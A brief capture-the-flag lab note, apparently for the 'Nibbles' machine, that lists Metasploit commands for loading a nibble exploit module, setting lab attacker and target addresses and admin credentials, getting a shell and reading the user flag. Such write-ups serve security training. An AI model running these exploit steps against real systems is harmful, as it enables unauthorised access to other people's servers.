**Gain a foothold on the target and submit the user.txt flag
```
sudo msfconsole
search nibble
use 0
set LHOST 10.10.15.224
set RHOSTS 10.129.197.111
set PASSWORD nibbles
set USERNAME admin
run
cd /home/nibble
cat user.txt
```
